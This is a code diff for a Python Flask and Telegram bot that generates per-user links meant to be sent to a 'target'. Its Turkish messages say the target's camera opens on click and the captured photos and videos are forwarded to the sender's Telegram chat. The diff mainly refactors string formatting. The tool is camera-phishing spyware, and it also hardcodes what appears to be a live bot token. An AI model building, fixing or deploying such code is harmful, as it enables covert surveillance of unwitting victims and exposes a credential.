@@ -4,40 +4,34 @@ import uuid
 import base64
 from io import BytesIO
 from flask import Flask, request, send_from_directory
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 import telegram
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 
 # ==================== CONFIG ====================
 TOKEN = os.environ.get("BOT_TOKEN", "8845469880:AAEEENGVv_igk7_DzrgMdK2UGG9Dnzva8VY")
 
-# Railway domain
 RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN") or os.environ.get("RAILWAY_STATIC_URL")
 if RAILWAY_DOMAIN:
-    WEBHOOK_URL = f"https://{RAILWAY_DOMAIN}"
+    WEBHOOK_URL = "https://" + RAILWAY_DOMAIN
 else:
     WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://your-app.up.railway.app")
 
 PORT = int(os.environ.get("PORT", 5000))
 
-# Kullanici verileri
 user_tokens = {}
 
-# Logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Flask app
-app = Flask(__name__, static_folder='static')
+app = Flask(__name__, static_folder="static")
 
-# Telegram Bot (sync)
 bot = telegram.Bot(token=TOKEN)
 
-# ==================== FLASK ROUTES ====================
-@app.route(f"/{TOKEN}", methods=["POST"])
+# ==================== ROUTES ====================
+@app.route("/" + TOKEN, methods=["POST"])
 def telegram_webhook():
     json_data = request.get_json()
 
-    # Mesaji isle
     if "message" in json_data and "text" in json_data["message"]:
         chat_id = json_data["message"]["chat"]["id"]
         user_id = json_data["message"]["from"]["id"]
@@ -52,30 +46,16 @@ def telegram_webhook():
                 "chat_id": chat_id
             }
 
-            link = f"{WEBHOOK_URL}/c/{token}"
+            link = WEBHOOK_URL + "/c/" + token
 
             keyboard = [[InlineKeyboardButton("Linke Git", url=link)]]
             reply_markup = InlineKeyboardMarkup(keyboard)
 
-            # Emoji YOK - f-string sorunu olmasin
-            message_text = (
-                "Merhaba @" + username + "!
-
-"
-                "Ozel Linkiniz:
-" + link + "
-
-"
-                "Bu linki hedefe gonderin.
-"
-                "Hedef linke tiklayinca kamera otomatik acilir!
-"
-                "Fotograf cekilip size aninda gonderilir."
-            )
+            msg = "Merhaba @" + username + "!\n\nOzel Linkiniz:\n" + link + "\n\nBu linki hedefe gonderin. Hedef linke tiklayinca kamera acilir ve fotograf cekilir."
 
             bot.send_message(
                 chat_id=chat_id,
-                text=message_text,
+                text=msg,
                 reply_markup=reply_markup
             )
 
@@ -107,15 +87,12 @@ def upload_photo(token):
     except:
         return {"error": "Invalid image"}, 400
 
-    caption = "Yeni Fotograf!
-
-Kullanici: @" + username + "
-Token: " + token
+    cap = "Yeni Fotograf!\n\nKullanici: @" + username + "\nToken: " + token
 
     bot.send_photo(
         chat_id=chat_id,
         photo=BytesIO(image_bytes),
-        caption=caption
+        caption=cap
     )
 
     return {"success": True}, 200
@@ -133,14 +110,12 @@ def upload_video(token):
     chat_id = user_info["chat_id"]
     username = user_info["username"]
 
-    caption = "Yeni Video!
-
-Kullanici: @" + username
+    cap = "Yeni Video!\n\nKullanici: @" + username
 
     bot.send_video(
         chat_id=chat_id,
         video=video_file.read(),
-        caption=caption
+        caption=cap
     )
 
     return {"success": True}, 200
